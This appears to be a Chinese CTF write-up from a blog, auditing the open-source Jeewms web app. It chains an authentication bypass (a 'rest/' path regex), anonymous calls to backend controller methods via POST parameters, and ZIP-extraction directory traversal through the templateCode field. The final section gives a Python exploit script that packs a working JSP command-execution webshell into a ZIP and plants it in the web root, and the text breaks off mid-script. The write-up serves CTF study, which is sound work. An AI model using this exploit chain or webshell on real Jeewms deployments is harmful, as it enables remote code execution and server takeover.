---
title: CTF WEB-Jeewms
url: https://mp.weixin.qq.com/s/JITu3oyIFADI-aUDypYpNQ
source: Doonsec's feed
date: 2026-03-18
fetch_date: 2026-03-19T04:14:53.227085
---

# CTF WEB-Jeewms

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/pJ1dj4ecKBVTpRhQQG5U9cpbNQCHVpwWOBTftON6iaDyX3HoDSdDxSyNfe5GVB7JMhDROna6WBooRLibgTwa0lL2iaPV5OSUUsCK7yjjGACFws/0?wx_fmt=jpeg)

# CTF WEB-Jeewms

原创

Kano
Kano

Kano Blog

![]()

在小说阅读器中沉浸阅读

## 前言

> ❝
>
> PS：确实应该好好学学`java`了。。。不然有些题从`github上down`下来一个`0day`你就审吧

题目是开源项目`jeewms.`

#### 鉴权绕过

审计得到在`/WEB-INF/org/interceptors的AuthInterceptor`文件有如下鉴权逻辑

```
public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object object) throws Exception {
        String requestPath = ResourceUtil.getRequestPath(request);
        if (requestPath.matches("^rest/[a-zA-Z0-9_/]+$")) {
            return true;
        } else if (this.excludeUrls.contains(requestPath)) {
            return true;
        } else if (this.moHuContain(this.excludeContainUrls, requestPath)) {
            return true;
```

这里用了或逻辑，可以通过构造`rest/`开头的`requestPath uri`实现绕过后面的严格or模糊匹配。 根据这个入手点继续寻找`requestPath`相关逻辑在`org/jeecgframework/core/util/ResourceUtil.class`中

```
public static String getRequestPath(HttpServletRequest request) {
    String queryString = request.getQueryString();
    String requestPath = request.getRequestURI();
    if (StringUtils.isNotEmpty(queryString)) {
        requestPath = requestPath + "?" + queryString;
    }

    if (requestPath.indexOf("&") > -1) {
        requestPath = requestPath.substring(0, requestPath.indexOf("&"));
    }

    requestPath = requestPath.substring(request.getContextPath().length() + 1);
    return requestPath;
}
```

这里还有个关键点：

1.只有存在`query string`时，`?xxx`才会拼接到路径后面`query string`时，`?xxx`才会拼接到路径后面

2.如果`URI`本身没有`query string`，那么`requestPath`就是纯路径。

根据这个逻辑可以知道应该构造无`query`的`URI`防止路径拼接（即绕过`’?‘`审查）实现完全正则匹配，可以被匿名放行。

#### 前台匿名调用后台接口

在`jeecg`这里很多`controller`的方法不是靠`URI`区分，而是靠

```
@RequestMapping(params = {"uploadZip"})
@RequestMapping(params = {"doAdd"})
```

这种正则参数匹配来进行分发，也就是说明在`Spring MVC`在匹配`(params={...})`时，`POST`表单中的传参同样会参与匹配。 所以我们可以：

1.URI保持为`/jeewms/rest/cgformTemplateController`

2.不携带`query string`绕过鉴权

3.将`uploadZip`和`doAdd`两种关键方法放进`POST body`这样就可以匿名调用后台的方法。

那么为什么要调用这两种方法呢？

#### ZIP 解压⽬录穿越

在`WEB-INF/classes/org/jeecgframework/web/cgform/controller/template/CgformTemplateController.class`文件中：

```
@RequestMapping(
        params = {"doAdd"}
    )
    @ResponseBody
    public AjaxJson doAdd(CgformTemplateEntity cgformTemplate, HttpServletRequest request) {
        String message = null;
        AjaxJson j = new AjaxJson();
        message = "自定义模板添加成功";

        try {
            this.cgformTemplateService.save(cgformTemplate);
            String basePath = this.getUploadBasePath(request);
            File templeDir = new File(basePath + File.separator + cgformTemplate.getTemplateCode());//这里
            if (!templeDir.exists()) {
                templeDir.mkdirs();
            }

            this.removeZipFile(basePath + File.separator + "temp" + File.separator + cgformTemplate.getTemplateZipName(), templeDir.getAbsolutePath());
            this.removeIndexFile(basePath + File.separator + "temp" + File.separator + cgformTemplate.getTemplatePic(), templeDir.getAbsolutePath());
            this.systemService.addLog(message, Globals.Log_Type_INSERT, Globals.Log_Leavel_INFO);
        } catch (Exception e) {
            e.printStackTrace();
            message = "自定义模板添加失败";
            thrownew BusinessException(e.getMessage());
        }

        j.setMsg(message);
        return j;
    }
```

审计后发现问题在这里：

```
File templeDir = new File(basePath + File.separator + cgformTemplate.getTemplateCode());
```

`templateCode`为用户完全可控参数，而且没有做规范化或者路径校验，那么这里存在路径穿越。同文件中的`removeZipFile`：

```
private void removeZipFile(String zipFilePath, String templateDir) {
    File zipFile = new File(zipFilePath);
    if (zipFile.exists() && !zipFile.isDirectory()) {
        try {
            this.unZipFiles(zipFile, templateDir);
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            org.jeecgframework.core.util.FileUtils.delete(zipFilePath);
        }
    }
}
```

也就是说上传的`ZIP`会被解压到`templateDir`，而`templateDir`由`templateCode`拼接。

```
public AjaxJson uploadZip(HttpServletRequest request, HttpServletResponse response) {
        AjaxJson j = new AjaxJson();
        MultipartHttpServletRequest multipartRequest = (MultipartHttpServletRequest)request;
        Map<String, MultipartFile> fileMap = multipartRequest.getFileMap();
        File picTempFile = null;
        File tempDir = new File(this.getUploadBasePath(request), "temp");
        if (!tempDir.exists()) {
            tempDir.mkdirs();
        }

        for(Map.Entry<String, MultipartFile> entity : fileMap.entrySet()) {
            MultipartFile file = (MultipartFile)entity.getValue();
            picTempFile = new File(tempDir.getAbsolutePath(), "/zip_" + request.getSession().getId() + "." + org.jeecgframework.core.util.FileUtils.getExtend(file.getOriginalFilename()));

            try {
                if (picTempFile.exists()) {
                    FileUtils.forceDelete(picTempFile);
                }

                FileCopyUtils.copy(file.getBytes(), picTempFile);
            } catch (Exception e) {
                e.printStackTrace();
                j.setMsg("模板文件上传失败！");
                j.setSuccess(false);
            }

            j.setObj(picTempFile.getName());
        }

        j.setMsg("模板文件上传成功！");
        j.setSuccess(true);
        return j;
    }
```

#### 这意味着：

1.先调用匿名`uploadZip`方法

2.让服务端把恶意`Zip`存到模板临时目录

3.再调用匿名`doAdd`

4.用穿越后的`templateCode`指定最终解压目录

根据上述分析我们得到了，调用这两种方法的目的是利用目录穿越让我们可以将`JSP`马写到`web`的根目录下。`getUploadBasePath` 这⾥再做⼀个⽬录穿越

```
private String getUploadBasePath(HttpServletRequest request) {
        ClassLoader classLoader = this.getClass().getClassLoader();
        URL resource = classLoader.getResource("sysConfig.properties");
        String path = resource.getPath();
        path = path.substring(0, path.indexOf("sysConfig.properties")) + "online/template";
        path = path.replaceAll("%20", " ");
        return path;
    }
```

在当前题目环境中，观察一下目录树显然实际路径落点是：`/usr/local/tomcat/webapps/jeewms/WEB-INF/classes/online/template`

![](https://mmbiz.qpic.cn/mmbiz_png/pJ1dj4ecKBXBAW5zFr2gUht3pM83Ybr3SUKbSEiauWd8Nxzbvy6NZJb0mot2jD8omu6TBBq5h0vIKvkLx8DMT1ekPb8z7icEbibOicZnKicp3USg/640?wx_fmt=png&from=appmsg)

因此`/usr/local/tomcat/webapps/jeewms/WEB INF/classes/online/template/../../../../`进行四次穿越后正好到达`/usr/local/tomcat/webapps/jeewms`即`Web根目录`。然后按照上面的分析`zip`打个马就行了。

# 附exp：

```
import requests
import io
import zipfile
import uuid
import sys
import urllib3
import os

BASE_URL = "http://127.0.0.1:8081/jeewms"
CONTROLLER_URL = f"{BASE_URL}/rest/cgformTemplateController"

SHELL_FILENAME = f"shell_{uuid.uuid4().hex[:6]}.jsp"
SHELL_CONTENT = """<%
    if(request.getParameter("cmd") != null){        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();        int a = -1;        byte[] b = new byte[2048];        while((a=in.read(b))!=-1){            out.print(new String(b));        }    }%>"""

def build_zip():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr(SHELL_FILENAME, SHELL_CONTENT)
    return buf.getvalue()

def exploit():
    print(f"[*] 目标: {BASE_URL}")
    print(f"[*] 步骤 1: 上传恶意 ZIP (通过 uploadZip 绕过鉴权)...")
    zip_data = build_zip()
    files = {
        'f': ('payload.zip', zip_data, 'application/zip')
    }
    data = {'uploadZip': ''}

    try:
        r1 = requests.post(CONTROLLER_URL, data=data, files=files, timeout=10)
        if r1.status_code != 200:
            print(f"[-] 上传失败，状态码: {r1.status_code}")
            return
        resp_json = r1.json()
        temp_zip_name = resp_json.get("obj")
        ifnot temp_zip_name:
            print(f"[-] 未获取到临时 ZIP 名称: {r1.text}")
            return
        print(f"[+] 临时 ZIP 文件名: {temp_zip_name}")
        print(f"[*] 步骤 2: 触发目录穿越解压 (doAdd)...")
        payload = {
            "doAdd": "",
            "templateName": "test_tp...